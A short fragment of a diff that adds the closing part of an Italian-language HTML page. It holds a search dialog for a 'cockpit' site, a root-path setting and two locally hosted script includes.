+  <input type="search" id="ricerca-campo" placeholder="Cerca in tutto il cockpit…" autocomplete="off">
+  <ul id="ricerca-esiti"></ul>
+</dialog>
+
+<script>window.RADICE = "../";</script>
+<script src="../assets/indice.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
